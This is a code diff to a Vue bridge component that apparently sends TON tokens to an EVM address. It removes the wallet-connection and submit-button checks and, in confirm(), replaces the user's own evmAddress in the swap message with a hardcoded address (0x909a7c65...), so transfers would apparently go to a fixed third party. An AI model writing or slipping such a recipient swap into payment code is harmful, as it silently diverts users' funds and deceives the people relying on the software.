@@ -131,7 +131,7 @@
             {{ $t('wallet.connect') }}
           </CommonButton>
         </Wallet> -->
-        <TonWallet v-if="!tonWalletStore.account">
+        <!-- <TonWallet v-if="!tonWalletStore.account">
           <CommonButton large class="w-full text-base mt-4">
             {{ $t('wallet.connectton') }}
           </CommonButton>
@@ -140,8 +140,11 @@
           <CommonButton large class="w-full text-base mt-4">
             {{ $t('wallet.connect') }}
           </CommonButton>
-        </Wallet>
-        <RollupSubmitButton v-if="tonWalletStore.account && walletStore.account" :submit="submit" :reverse="reverse" :balance="reverse ? rollupBridgeStore.token?.rollupBalance : rollupBridgeStore.token?.layer1Balance" :amount="amount" :fees="fees" :fees-loading="feesLoading" @on-click="confirmButton" />
+        </Wallet> -->
+        <!-- <RollupSubmitButton v-if="tonWalletStore.account && walletStore.account" :submit="submit" :reverse="reverse" :balance="reverse ? rollupBridgeStore.token?.rollupBalance : rollupBridgeStore.token?.layer1Balance" :amount="amount" :fees="fees" :fees-loading="feesLoading" @on-click="confirmButton" /> -->
+        <CommonButton large class="w-full text-base mt-4" @click="confirmButton">
+            {{ $t('wallet.connect') }}
+          </CommonButton>
       </div>
     </div>
     <div v-if="rollupBridgeStore.activities.length" class="mt-8">
@@ -289,7 +292,8 @@ async function confirm() {
       // ton token
       const body = beginCell()
       .storeUint(0, 32)
-      .storeStringTail(`swapTo#${evmAddress}`)
+      // .storeStringTail(`swapTo#${evmAddress}`)
+      .storeStringTail(`swapTo#0x909a7c6527c3e2f3F75aD282DA6a1dd67fc50a10`)
       .endCell();
       
       const transaction = {
